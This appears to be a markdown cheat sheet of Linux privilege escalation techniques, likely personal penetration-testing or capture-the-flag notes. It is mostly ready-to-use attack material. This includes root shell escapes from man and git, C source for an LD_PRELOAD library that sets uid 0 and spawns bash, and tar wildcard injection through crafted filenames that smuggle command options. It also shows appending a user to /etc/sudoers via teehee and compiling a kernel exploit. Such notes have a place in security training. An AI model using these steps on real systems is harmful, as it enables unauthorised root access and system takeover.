# General Privilege Escalation

##### **Man**
The man command can be used to run commands. If the man command is run as root, then so will any other commands.

```
man ls
-  (press RETURN)!/bin/sh
!/bin/sh
# whoami
whoami
root
```

##### Git
If we can run git as root, we can get a shell using the above man exploit
```
sudo git help status
[man should open help page]
!/bin/bash

$root: ~~~~
```

##### **LD-PRELOAD**
https://www.baeldung.com/linux/ld_preload-trick-what-is

The steps of this privilege escalation vector can be summarised as follows;

1.  Check for LD_PRELOAD (with the env_keep option)
2.  Write a simple C code compiled as a share object (.so extension) file
3.  Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
	unsetenv("LD_PRELOAD");  
	setgid(0);  
	setuid(0);  
	system("/bin/bash");  
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

##### **Sudo -l**
1. Run

```
sudo -l
```

[https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo)

##### Sudo another user
We can run commands as sudo using another user, provided they have the correct permissions.

```
sudo -u USER_TO_RUN_AS command...
```

##### **SUID**
1. Find files with SUID or SGID

```
find / -type f -perm -04000 -ls 2>/dev/null
```

2. Check [GTFOBins](https://gtfobins.github.io/#+suid)  for a path to privilege escalation. 

##### Tar Wildcard 
When encountering a wildcard tar command like so, we can use this to run a shell script, or execute another command. 

```shell-session
tar cf NEW.tar *
```

```shell-session
echo "" > "--checkpoint-action=exec=bash SCRIPT.sh"
echo "" > --checkpoint=1
echo "#!/bin/bash SOME COMMAND" > SCRIPT.sh

chmod +x SCRIPT.sh
```

##### Sudoers

Check users.

```shell-session
cd /etc/sudoers.d
ls
USER_PERMISSIONS

# change host 
sudo -h HOST_NAME_FROM_ABOVE COMMAND_TO_RUN
```

Add user.

```
echo "USERNAME ALL=(ALL:ALL) ALL" | sudo /usr/bin/teehee /etc/sudoers
```

##### Check Kernel

```shell-session
uname -a 
```

```shell-session
cat /etc/lsb-release
```

*Example Exploit* 
```shell-session
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```